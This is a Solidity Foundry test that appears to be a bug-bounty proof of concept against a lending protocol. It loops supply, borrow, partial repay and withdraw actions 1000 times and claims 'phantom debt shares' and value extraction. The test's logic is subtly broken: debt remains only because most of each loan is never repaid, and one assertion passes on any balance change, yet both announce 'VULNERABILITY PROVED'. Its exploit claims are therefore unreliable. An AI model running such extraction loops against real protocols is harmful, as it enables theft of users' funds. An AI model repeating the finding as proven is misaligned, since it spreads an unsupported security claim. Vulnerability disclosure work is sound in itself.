function test_immunefi_drift_extraction_poc() public {
    uint256 startCapital = 100_000_000;
    uint256 cycles = 1000;
    
    deal(address(tokenList.dai), bob, startCapital * cycles);

    uint256 wethCollateral = 1000e18;
    deal(address(tokenList.weth), bob, wethCollateral);
    
    vm.prank(bob);
    tokenList.weth.approve(address(spoke1), type(uint256).max);
    
    SpokeActions.supplyCollateral({
      spoke: spoke1,
      reserveId: _wethReserveId(spoke1),
      caller: bob,
      amount: wethCollateral,
      onBehalfOf: bob
    });

    uint256 initialBobBalance = tokenList.dai.balanceOf(bob);
    
    vm.prank(bob);
    tokenList.dai.approve(address(spoke1), type(uint256).max);

    for (uint256 i = 0; i < cycles; i++) {
      SpokeActions.supply({
        spoke: spoke1,
        reserveId: _daiReserveId(spoke1),
        caller: bob,
        amount: startCapital,
        onBehalfOf: bob
      });

      uint256 borrowAmount = (startCapital * 99) / 100;
      SpokeActions.borrow({
        spoke: spoke1,
        reserveId: _daiReserveId(spoke1),
        caller: bob,
        amount: borrowAmount,
        onBehalfOf: bob
      });

      uint256 repayAmount = borrowAmount / 100;
      SpokeActions.repay({
        spoke: spoke1,
        reserveId: _daiReserveId(spoke1),
        caller: bob,
        amount: repayAmount,
        onBehalfOf: bob
      });

      uint256 withdrawable = spoke1.getUserSuppliedAssets(_daiReserveId(spoke1), bob);
      if (withdrawable > 0) {
        SpokeActions.withdraw({
          spoke: spoke1,
          reserveId: _daiReserveId(spoke1),
          caller: bob,
          amount: withdrawable,
          onBehalfOf: bob
        });
      }
    }

    uint256 finalBobBalance = tokenList.dai.balanceOf(bob);
    ISpoke.UserPosition memory finalPos = spoke1.getUserPosition(_daiReserveId(spoke1), bob);
    uint256 remainingDebtShares = finalPos.drawnShares;
    int256 netPosition = int256(finalBobBalance) - int256(initialBobBalance);
    
    console.log("--- IMMUNEFI TELEMETRY ---");
    console.log("Cycles Run: ", cycles);
    console.log("Phantom Debt Shares Remaining: ", remainingDebtShares);
    
    if (netPosition < 0) {
        console.log("Net External Token Drift (Negative): ", uint256(-netPosition));
    } else {
        console.log("Net External Token Drift (Positive): ", uint256(netPosition));
    }

    assertTrue(
      remainingDebtShares > 0, 
      "VULNERABILITY PROVED: Phantom debt shares persist after cycle completion"
    );
    
    assertTrue(
      netPosition > 0 || finalBobBalance != initialBobBalance, 
      "VULNERABILITY PROVED: Asymmetric value extraction successful"
    );
  }
